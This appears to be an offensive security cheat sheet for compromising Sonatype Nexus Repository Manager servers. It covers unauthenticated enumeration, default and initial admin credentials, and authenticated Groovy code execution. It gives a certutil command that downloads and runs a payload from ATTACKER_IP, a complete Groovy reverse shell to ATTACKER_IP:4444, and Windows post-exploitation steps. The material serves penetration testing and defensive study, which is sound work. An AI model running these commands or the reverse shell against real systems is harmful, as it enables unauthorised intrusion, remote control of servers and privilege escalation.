# Sonatype Nexus Repository Manager

Sonatype Nexus Repository Manager often exposes useful version details and REST endpoints before authentication. After admin access, Groovy scripting and scheduled tasks can lead to command execution.

## Discovery

```bash
curl -I http://TARGET:8081/
curl http://TARGET:8081/robots.txt
curl http://TARGET:8081/service/rest/swagger.json
```

Useful indicators:

```text
Server: Nexus/3.x.x-xx (OSS)
Nexus Repository Manager
/repository/
/service/
```

Nuclei is useful for passive detection, but aggressive scans can make smaller Nexus instances unstable:

```bash
nuclei -target http://TARGET:8081 -rl 5 -c 3 -as
```

## REST Enumeration

```bash
curl http://TARGET:8081/service/rest/v1/repositories
curl http://TARGET:8081/service/rest/v1/search
curl http://TARGET:8081/service/rest/v1/search/assets
curl 'http://TARGET:8081/service/rest/v1/components?repository=REPO_NAME'
```

Probe repository names directly:

```bash
curl http://TARGET:8081/repository/
curl http://TARGET:8081/repository/maven-releases/
curl http://TARGET:8081/repository/npm-public/
```

Response wording can distinguish a missing repository from a malformed repository path.

## Default / Initial Admin Password

Nexus 3.17.0+ generates the first admin password in the data directory instead of using `admin:admin123`.

Common locations:

```text
/opt/sonatype-work/nexus3/admin.password
C:\nexus\sonatype-work\nexus3\admin.password
```

Older installs may still use:

```text
admin:admin123
```

## Authenticated Groovy RCE

If scripts are enabled, use the script API or the admin UI to run Groovy. On Windows, a custom Groovy task can execute `cmd.exe` and spawn a callback.

Simple command execution:

```groovy
println 'cmd /c whoami'.execute().text
println 'cmd /c hostname'.execute().text
```

Download and run a payload:

```groovy
println 'cmd /c certutil -urlcache -f http://ATTACKER_IP/payload.exe C:\\Windows\\Temp\\payload.exe'.execute().text
println 'cmd /c start /b C:\\Windows\\Temp\\payload.exe'.execute().text
```

Pure Groovy reverse shell for Windows:

```groovy
String host="ATTACKER_IP";
int port=4444;
String cmd="cmd";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try { p.exitValue(); break; } catch (Exception e) {}
}
p.destroy();
s.close();
```

## Windows Post-Exploitation

Check the service account and install paths from the UI or shell:

```cmd
whoami
set
sc qc Nexus-Repository-Service
dir C:\nexus\
dir C:\nexus\sonatype-work\nexus3\
```

If the service binary or Nexus install directory is writable by low-privileged users, treat it as a Windows service-binary escalation path. See [Windows Privilege Escalation](../windows-priv-esc/win-priv-esc.md).

